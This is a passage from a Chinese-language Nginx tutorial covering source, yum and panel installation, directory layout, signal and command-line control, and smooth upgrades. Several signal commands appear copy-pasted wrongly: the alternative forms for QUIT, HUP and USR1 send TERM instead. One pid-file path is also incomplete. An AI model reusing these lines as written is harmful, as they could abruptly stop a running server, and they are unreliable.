class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p nginx/core<br><span class="hljs-built_in">mv</span> nginx-1.16.1.tar.gz nginx/core<br></code></pre></td></tr></table></figure><p>(3)解压缩</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -xzf nginx-<span class="hljs-number">1</span>.<span class="hljs-number">16</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>(4)进入资源文件中，发现configure</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./configure<br></code></pre></td></tr></table></figure><p>(5)编译</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>(6)安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h4 id="方案二yum安装"><a class="markdownIt-Anchor" href="#方案二yum安装"></a> 方案二：yum安装</h4><p>使用源码进行简单安装，我们会发现安装的过程比较繁琐，需要提前准备GCC编译器、PCRE兼容正则表达式库、zlib压缩库、OpenSSL安全通信的软件库包，然后才能进行Nginx的安装。</p><p>（1）安装yum-utils</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo yum  <span class="hljs-keyword">install</span> -y yum-utils<br></code></pre></td></tr></table></figure><p>（2）添加yum源文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/yum</span>.repos.d/nginx.repo<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[nginx-stable]</span><br><span class="hljs-attr">name</span>=nginx stable repo<br><span class="hljs-attr">baseurl</span>=http://nginx.org/packages/centos/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">gpgkey</span>=https://nginx.org/keys/nginx_signing.key<br><span class="hljs-attr">module_hotfixes</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[nginx-mainline]</span><br><span class="hljs-attr">name</span>=nginx mainline repo<br><span class="hljs-attr">baseurl</span>=http://nginx.org/packages/mainline/centos/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">enabled</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">gpgkey</span>=https://nginx.org/keys/nginx_signing.key<br><span class="hljs-attr">module_hotfixes</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>（3）查看是否安装成功</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">yum list <span class="hljs-string">| grep nginx</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581416861684.png" alt="1581416861684" /></p><p>（4）使用yum进行安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo  yum <span class="hljs-keyword">install</span> -y nginx<br></code></pre></td></tr></table></figure><p>（5）查看nginx的安装位置</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">whereis nginx</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581416981939.png" alt="1581416981939" /></p><p>（6）启动测试</p><h4 id="源码简单安装和yum安装的差异"><a class="markdownIt-Anchor" href="#源码简单安装和yum安装的差异"></a> 源码简单安装和yum安装的差异：</h4><p>这里先介绍一个命令: <code>./nginx -V</code>,通过该命令可以查看到所安装Nginx的版本及相关配置信息。</p><p>简单安装</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586016586042.png" alt="1586016586042" /></p><p>yum安装</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586016605581.png" alt="1586016605581" /></p><h5 id="解压nginx目录"><a class="markdownIt-Anchor" href="#解压nginx目录"></a> 解压Nginx目录</h5><p>执行<code>tar -zxvf nginx-1.16.1.tar.gz</code>对下载的资源进行解压缩，进入压缩后的目录，可以看到如下结构</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581421319232.png" alt="1581421319232" /></p><p>内容解释：</p><p>auto:存放的是编译相关的脚本</p><p>CHANGES:版本变更记录</p><p><a href="http://CHANGES.ru">CHANGES.ru</a>:俄罗斯文的版本变更记录</p><p>conf:nginx默认的配置文件</p><p>configure:nginx软件的自动脚本程序,是一个比较重要的文件，作用如下：</p><p>​（1）检测环境及根据环境检测结果生成C代码</p><p>​（2）生成编译代码需要的Makefile文件</p><p>contrib:存放的是几个特殊的脚本文件，其中README中对脚本有着详细的说明</p><p>html:存放的是Nginx自带的两个html页面，访问Nginx的首页和错误页面</p><p>LICENSE:许可证的相关描述文件</p><p>man:nginx的man手册</p><p>README:Nginx的阅读指南</p><p>src:Nginx的源代码</p><h4 id="方案三nginx的源码复杂安装"><a class="markdownIt-Anchor" href="#方案三nginx的源码复杂安装"></a> 方案三:Nginx的源码复杂安装</h4><p>这种方式和简单的安装配置不同的地方在第一步，通过<code>./configure</code>来对编译参数进行设置，需要我们手动来指定。那么都有哪些参数可以进行设置，接下来我们进行一个详细的说明。</p><p>PATH:是和路径相关的配置信息</p><p>with:是启动模块，默认是关闭的</p><p>without:是关闭模块，默认是开启的</p><p>我们先来认识一些简单的路径配置已经通过这些配置来完成一个简单的编译：</p><p>–prefix=PATH</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">指向Nginx的安装目录，默认值为<span class="hljs-regexp">/usr/</span>local/nginx   <br></code></pre></td></tr></table></figure><p>–sbin-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">指向(执行)程序文件(nginx)的路径,默认值为&lt;prefix&gt;<span class="hljs-regexp">/sbin/</span>nginx<br></code></pre></td></tr></table></figure><p>–modules-path=PATH</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">指向<span class="hljs-type">Nginx动态模块安装目录，默认值为</span>&lt;<span class="hljs-keyword">prefix</span>&gt;<span class="hljs-operator">/</span>modules<br></code></pre></td></tr></table></figure><p>–conf-path=PATH</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">指向配置文件(nginx.<span class="hljs-keyword">conf</span>)的路径,默认值为<span class="hljs-symbol">&lt;prefix&gt;</span>/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>–error-log-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">指向错误日志文件的路径,默认值为&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>error.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>–http-log-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">指向访问日志文件的路径,默认值为&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>–pid-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">指向Nginx启动后进行ID的文件路径，默认值为&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>nginx.pid<br></code></pre></td></tr></table></figure><p>–lock-path=PATH</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">指向Nginx锁文件的存放路径,默认值为&lt;prefix&gt;<span class="hljs-regexp">/logs/</span>nginx.lock<br></code></pre></td></tr></table></figure><p>要想使用可以通过如下命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>nginx \<br>--sbin-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx \<br>--modules-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/m</span>odules \<br>--conf-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf \<br>--error-log-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/error.log \<br>--http-log-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/access.log \<br>--pid-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/nginx.pid \<br>--lock-path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/nginx.lock<br></code></pre></td></tr></table></figure><p>在使用上述命令之前，需要将之前服务器已经安装的nginx进行卸载，卸载的步骤分为三步骤：</p><p>步骤一：需要将nginx的进程关闭</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">./nginx -s stop<br></code></pre></td></tr></table></figure><p>步骤二:将安装的nginx进行删除</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -rf <span class="hljs-regexp">/usr/</span>local/nginx<br></code></pre></td></tr></table></figure><p>步骤三:将安装包之前编译的环境清除掉</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span><br></code></pre></td></tr></table></figure><h4 id="方案四宝塔安装"><a class="markdownIt-Anchor" href="#方案四宝塔安装"></a> 方案四:宝塔安装</h4><p>在宝塔面板选择安装。没有尝试后面的模块添加。但是也有些模块宝塔默认帮我们添加了。</p><h3 id="nginx目录结构分析"><a class="markdownIt-Anchor" href="#nginx目录结构分析"></a> Nginx目录结构分析</h3><p>在使用Nginx之前，我们先对安装好的Nginx目录文件进行一个分析，在这块给大家介绍一个工具tree，通过tree我们可以很方面的去查看centos系统上的文件目录结构，当然，如果想使用tree工具，就得先通过<code>yum install -y tree</code>来进行安装，安装成功后，可以通过执行<code>tree /usr/local/nginx</code>(tree后面跟的是Nginx的安装目录)，获取的结果如下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581439634265.png" alt="1581439634265" /></p><p>conf:nginx所有配置文件目录</p><p>​    CGI(Common Gateway Interface)通用网关【接口】，主要解决的问题是从客户端发送一个请求和数据，服务端获取到请求和数据后可以调用调用CGI【程序】处理及相应结果给客户端的一种标准规范。</p><p>​fastcgi.conf:fastcgi相关配置文件</p><p>​fastcgi.conf.default:fastcgi.conf的备份文件</p><p>​fastcgi_params:fastcgi的参数文件</p><p>​fastcgi_params.default:fastcgi的参数备份文件</p><p>​scgi_params:scgi的参数文件</p><p>​scgi_params.default：scgi的参数备份文件</p><p>​    uwsgi_params:uwsgi的参数文件</p><p>​uwsgi_params.default:uwsgi的参数备份文件</p><p>​mime.types:记录的是HTTP协议中的Content-Type的值和文件后缀名的对应关系</p><p>​mime.types.default:mime.types的备份文件</p><p>​nginx.conf:这个是Nginx的核心配置文件，这个文件非常重要，也是我们即将要学习的重点</p><p>​nginx.conf.default:nginx.conf的备份文件</p><p>​koi-utf、koi-win、win-utf这三个文件都是与编码转换映射相关的配置文件，用来将一种编码转换成另一种编码</p><p>html:存放nginx自带的两个静态的html页面</p><p>​50x.html:访问失败后的失败页面</p><p>​index.html:成功访问的默认首页</p><p>logs:记录入门的文件，当nginx服务器启动后，这里面会有 access.log error.log 和nginx.pid三个文件出现。</p><p>sbin:是存放执行程序文件nginx</p><p>​nginx是用来控制Nginx的启动和停止等相关的命令。</p><h4 id=""><a class="markdownIt-Anchor" href="#"></a> </h4><h3 id="nginx服务器启停命令"><a class="markdownIt-Anchor" href="#nginx服务器启停命令"></a> Nginx服务器启停命令</h3><p>Nginx安装完成后，接下来我们要学习的是如何启动、重启和停止Nginx的服务。</p><p>对于Nginx的启停在linux系统中也有很多种方式，我们本次课程介绍两种方式：</p><ol><li><p>Nginx服务的信号控制</p></li><li><p>Nginx的命令行控制</p></li></ol><h4 id="方式一nginx服务的信号控制"><a class="markdownIt-Anchor" href="#方式一nginx服务的信号控制"></a> 方式一:Nginx服务的信号控制</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Nginx中的<span class="hljs-literal">master</span>和worker进程?<br>Nginx的工作方式?<br>如何获取进程的PID?<br>信号有哪些?<br>如何通过信号控制Nginx的启停等相关操作?<br></code></pre></td></tr></table></figure><p>前面在提到Nginx的高性能，其实也和它的架构模式有关。Nginx默认采用的是多进程的方式来工作的，当将Nginx启动后，我们通过<code>ps -ef | grep nginx</code>命令可以查看到如下内容：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581444289294.png" alt="1581444289294" /></p><p>从上图中可以看到,Nginx后台进程中包含一个master进程和多个worker进程，master进程主要用来管理worker进程，包含接收外界的信息，并将接收到的信号发送给各个worker进程，监控worker进程的状态，当worker进程出现异常退出后，会自动重新启动新的worker进程。而worker进程则是专门用来处理用户请求的，各个worker进程之间是平等的并且相互独立，处理请求的机会也是一样的。nginx的进程模型，我们可以通过下图来说明下：</p><p><img src="F:%5C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%5C%E7%AC%94%E8%AE%B0%5Cassets%5C1581444603231.png" alt="1581444603231" /></p><p>我们现在作为管理员，只需要通过给master进程发送信号就可以来控制Nginx,这个时候我们需要有两个前提条件，一个是要操作的master进程，一个是信号。</p><p>（1）要想操作Nginx的master进程，就需要获取到master进程的进程号ID。获取方式简单介绍两个，</p><p>方式一：通过<code>ps -ef | grep nginx</code>；</p><p>方式二：在讲解nginx的<code>./configure</code>的配置参数的时候，有一个参数是<code>--pid-path=PATH</code>默认是<code>/usr/local/nginx/logs/nginx.pid</code>,所以可以通过查看该文件来获取nginx的master进程ID.</p><p>（2）信号</p><table><thead><tr><th>信号</th><th>作用</th></tr></thead><tbody><tr><td>TERM/INT</td><td>立即关闭整个服务</td></tr><tr><td>QUIT</td><td>&quot;优雅&quot;地关闭整个服务</td></tr><tr><td>HUP</td><td>重读配置文件并使用服务对新配置项生效</td></tr><tr><td>USR1</td><td>重新打开日志文件，可以用来进行日志切割</td></tr><tr><td>USR2</td><td>平滑升级到最新版的nginx</td></tr><tr><td>WINCH</td><td>所有子进程不在接收处理新连接，相当于给work进程发送QUIT指令</td></tr></tbody></table><p>调用命令为<code>kill -signal PID</code></p><p>signal:即为信号；PID即为获取到的master线程ID</p><ol><li>发送TERM/INT信号给master进程，会将Nginx服务立即关闭。</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">kill -TERM PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br>kill -<span class="hljs-keyword">INT</span> PID <span class="hljs-regexp">/ kill -INT `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="2"><li>发送QUIT信号给master进程，master进程会控制所有的work进程不再接收新的请求，等所有请求处理完后，在把进程都关闭掉。</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -QUIT PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="3"><li>发送HUP信号给master进程，master进程会把控制旧的work进程不再接收新的请求，等处理完请求后将旧的work进程关闭掉，然后根据nginx的配置文件重新启动新的work进程</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -HUP PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="4"><li>发送USR1信号给master进程，告诉Nginx重新开启日志文件</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -USR1 PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="5"><li>发送USR2信号给master进程，告诉master进程要平滑升级，这个时候，会重新开启对应的master进程和work进程，整个系统中将会有两个master进程，并且新的master进程的PID会被记录在<code>/usr/local/nginx/logs/nginx.pid</code>而之前的旧的master进程PID会被记录在<code>/usr/local/nginx/logs/nginx.pid.oldbin</code>文件中，接着再次发送QUIT信号给旧的master进程，让其处理完请求后再进行关闭</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -USR2 PID <span class="hljs-regexp">/ kill -USR2 `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -QUIT PID <span class="hljs-regexp">/ kill -QUIT `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid.oldbin`<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586368250085.png" alt="1586368250085" /></p><ol start="6"><li>发送WINCH信号给master进程,让master进程控制不让所有的work进程在接收新的请求了，请求处理完后关闭work进程。注意master进程不会被关闭掉</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -WINCH PID <span class="hljs-regexp">/kill -WINCH`cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><h4 id="方式二nginx的命令行控制"><a class="markdownIt-Anchor" href="#方式二nginx的命令行控制"></a> 方式二:Nginx的命令行控制</h4><p>此方式是通过Nginx安装目录下的sbin下的可执行文件nginx来进行Nginx状态的控制，我们可以通过<code>nginx -h</code>来查看都有哪些参数可以用：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581486604517.png" alt="1581486604517" /></p><p>-?和-h:显示帮助信息</p><p>-v:打印版本号信息并退出</p><p>-V:打印版本号信息和配置信息并退出</p><p>-t:测试nginx的配置文件语法是否正确并退出</p><p>-T:测试nginx的配置文件语法是否正确并列出用到的配置文件信息然后退出</p><p>-q:在配置测试期间禁止显示非错误消息</p><p>-s:signal信号，后面可以跟 ：</p><p>​ stop[快速关闭，类似于TERM/INT信号的作用]</p><p>​quit[优雅的关闭，类似于QUIT信号的作用]</p><p>​reopen[重新打开日志文件类似于USR1信号的作用]</p><p>​reload[类似于HUP信号的作用]</p><p>-p:prefix，指定Nginx的prefix路径，(默认为: /usr/local/nginx/)</p><p>-c:filename,指定Nginx的配置文件路径,(默认为: conf/nginx.conf)</p><p>-g:用来补充Nginx配置文件，向Nginx服务指定启动时应用全局的配置</p><h3 id="nginx服务器版本升级和新增模块"><a class="markdownIt-Anchor" href="#nginx服务器版本升级和新增模块"></a> Nginx服务器版本升级和新增模块</h3><p>如果想对Nginx的版本进行更新，或者要应用一些新的模块，最简单的做法就是停止当前的Nginx服务，然后开启新的Nginx服务。但是这样会导致在一段时间内，用户是无法访问服务器。为了解决这个问题，我们就需要用到Nginx服务器提供的平滑升级功能。这个也是Nginx的一大特点，使用这种方式，就可以使Nginx在7*24小时不间断的提供服务了。接下来我们分析下需求：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">需求：Nginx的版本最开始使用的是Nginx<span class="hljs-string">-1</span>.14.2,由于服务升级，需要将Nginx的版本升级到Nginx<span class="hljs-string">-1</span>.16.1,要求Nginx不能中断提供服务。<br></code></pre></td></tr></table></figure><p>为了应对上述的需求，这里我们给大家提供两种解决方案:</p><p>方案一:使用Nginx服务信号完成Nginx的升级</p><p>方案二:使用Nginx安装目录的make命令完成升级</p><h4 id="环境准备"><a class="markdownIt-Anchor" href="#环境准备"></a> 环境准备</h4><p>（1）先准备两个版本的Nginx分别是 1.14.2和1.16.1</p><p>（2）使用Nginx源码安装的方式将1.14.2版本安装成功并正确访问</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">进入安装目录<br>./configure<br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br></code></pre></td></tr></table></figure><p>（3）将Nginx1.16.1进行参数配置和编译，不需要进行安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">进入安装目录<br>./configure<br>make <br></code></pre></td></tr></table></figure><h4 id="方案一使用nginx服务信号进行升级"><a class="markdownIt-Anchor" href="#方案一使用nginx服务信号进行升级"></a> 方案一:使用Nginx服务信号进行升级</h4><p>第一步:将1.14.2版本的sbin目录下的nginx进行备份</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br>mv nginx nginxold<br></code></pre></td></tr></table></figure><p>第二步:将Nginx1.16.1安装目录编译后的objs目录下的nginx文件，拷贝到原来<code>/usr/local/nginx/sbin</code>目录下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd ~<span class="hljs-regexp">/nginx/</span>core<span class="hljs-regexp">/nginx-1.16.1/</span>objs<br>cp nginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br></code></pre></td></tr></table></figure><p>第三步:发送信号USR2给Nginx的1.14.2版本对应的master进程</p><p>第四步:发送信号QUIT给Nginx的1.14.2版本对应的master进程</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -QUIT `more <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/logs/</span>nginx.pid.oldbin`<br></code></pre></td></tr></table></figure><h4 id="方案二使用nginx安装目录的make命令完成升级"><a class="markdownIt-Anchor" href="#方案二使用nginx安装目录的make命令完成升级"></a> 方案二:使用Nginx安装目录的make命令完成升级</h4><p>第一步:将1.14.2版本的sbin目录下的nginx进行备份</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br>mv nginx nginxold<br></code></pre></td></tr></table></figure><p>第二步:将Nginx1.16.1安装目录编译后的objs目录下的nginx文件，拷贝到原来<code>/usr/local/nginx/sbin</code>目录下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd ~<span class="hljs-regexp">/nginx/</span>core<span class="hljs-regexp">/nginx-1.16.1/</span>objs<br>cp nginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br></code></pre></td></tr></table></figure><p>第三步:进入到安装目录，执行<code>make upgrade</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581494652284.png" alt="1581494652284" /></p><p>第四步:查看是否更新成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./nginx -v<br></code></pre></td></tr></table></figure><p>在整个过程中，其实Nginx是一直对外提供服务的。并且当Nginx的服务器启动成功后，我们是可以通过浏览器进行直接访问的，同时我们可以通过更改html目录下的页面来修改我们在页面上所看到的内容，那么问题来了，为什么我们要修改html目录下的文件，能不能多添加一些页面是Nginx的功能更加丰富，还有前面聊到Nginx的前端功能又是如何来实现的，这就需要我们对Nginx的核心配置文件进行一个详细的学习。</p><h2 id="nginx核心配置文件结构"><a class="markdownIt-Anchor" href="#nginx核心配置文件结构"></a> Nginx核心配置文件结构</h2><p>从前面的内容学习中，我们知道Nginx的核心配置文件默认是放在<code>/usr/local/nginx/conf/nginx.conf</code>，这一节，我们就来学习下nginx.conf的内容和基本配置方法。</p><p>读取Nginx自带的Nginx配置文件，我们将其中的注释部分【学习一个技术点就是在Nginx的配置文件中可以使用<code>#</code>来注释】删除掉后，就剩下下面内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs conf">worker_processes  1;<br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br>http &#123;<br>    include       mime.types;<br>    default_type  application/octet-stream;<br>    sendfile        on;<br>    keepalive_timeout  65;<br><br>    server &#123;<br>        listen       80;<br>        server_name  localhost;<br>        location / &#123;<br>            root   html;<br>            index  index.html index.htm;<br>        &#125;<br>        error_page   500 502 503 504  /50x.html;<br>        location = /50x.html &#123;<br>            root   html;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">指令名指令值;  <span class="hljs-comment">#全局块，主要设置Nginx服务器整体运行的配置指令</span><br><br> <span class="hljs-comment">#events块,主要设置,Nginx服务器与用户的网络连接,这一部分对Nginx服务器的性能影响较大</span><br>events &#123; <br>    指令名指令值;<br>&#125;<br><span class="hljs-comment">#http块，是Nginx服务器配置中的重要部分，代理、缓存、日志记录、第三方模块配置...             </span><br>http &#123;<br>    指令名指令值;<br>    server &#123; <span class="hljs-comment">#server块，是Nginx配置和虚拟主机相关的内容</span><br>        指令名指令值;<br>        <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; </span><br><span class="hljs-title">        #location</span>块，基于Nginx服务器接收请求字符串与location后面的值进行匹配，对特定请求进行处理<br>            指令名指令值;<br>        &#125;<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>简单小结下:</p><p>nginx.conf配置文件中默认有三大块：全局块、events块、http块</p><p>http块中可以配置多个server块，每个server块又可以配置多个location块。</p><h3 id="全局块"><a class="markdownIt-Anchor" href="#全局块"></a> 全局块</h3><h4 id="user指令"><a class="markdownIt-Anchor" 